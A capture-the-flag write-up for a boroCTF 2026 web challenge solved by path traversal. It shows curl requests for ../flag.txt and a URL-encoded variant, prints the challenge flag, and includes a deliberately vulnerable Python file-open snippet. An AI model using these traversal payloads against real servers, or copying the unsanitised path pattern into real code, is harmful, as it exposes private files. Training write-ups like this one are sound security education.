# dotdotslashflagtxt — boroCTF 2026

## Challenge Information

**Category:** Web
**Points:** 100

### Description

> A company left their internal document viewer exposed. It only shows approved files... or does it?

The challenge provides a simple document viewer exposing three text files:

```text
readme.txt
notes.txt
about.txt
```

---

## Initial Analysis

Opening the application revealed the following URLs:

```text
/view?file=readme.txt
/view?file=notes.txt
/view?file=about.txt
```

Immediately, the `file` parameter stood out as the likely attack surface.

Viewing the page source confirmed that the application simply passed filenames through the URL:

```html
<a href="/view?file=readme.txt">readme.txt</a>
<a href="/view?file=notes.txt">notes.txt</a>
<a href="/view?file=about.txt">about.txt</a>
```

The challenge title itself was also a major hint:

```text
dotdotslashflagtxt
```

which strongly suggests:

```text
../flag.txt
```

---

## Exploitation

The first test was attempting to access the flag directly:

```bash
curl -s "$BASE/view?file=flag.txt"
```

Result:

```text
File not found
```

Since the flag was not inside the public documents directory, the next step was trying path traversal.

```bash
curl -s "$BASE/view?file=../flag.txt"
```

Response:

```text
boroCTF{p@th_Tr@v3rs@L_r0Ck5!}
```

Success.

The application failed to sanitize traversal sequences, allowing access to files outside the intended directory.

For completeness, additional traversal attempts were tested:

```bash
curl -s "$BASE/view?file=../../flag.txt"
curl -s "$BASE/view?file=../../../flag.txt"
```

Both returned:

```text
File not found
```

This confirmed that the flag was located exactly one directory above the public documents folder.

---

## Alternative Payload

The same attack also worked using URL encoding:

```bash
curl -s "$BASE/view?file=..%2Fflag.txt"
```

where:

```text
%2F = /
```

---

## Root Cause

The application trusted user-controlled file paths.

A vulnerable implementation would resemble:

```python
filename = request.args.get("file")
open("documents/" + filename)
```

When supplied with:

```text
../flag.txt
```

the resulting path becomes:

```text
documents/../flag.txt
```

which resolves to:

```text
flag.txt
```

outside the intended directory.

---

## Flag

```text
boroCTF{p@th_Tr@v3rs@L_r0Ck5!}
```

---

## Takeaway

This challenge demonstrates a classic Path Traversal vulnerability.

The title practically revealed the solution: `../flag.txt`.

By manipulating the `file` parameter, it was possible to escape the document directory and read arbitrary files from the server, ultimately exposing the flag.

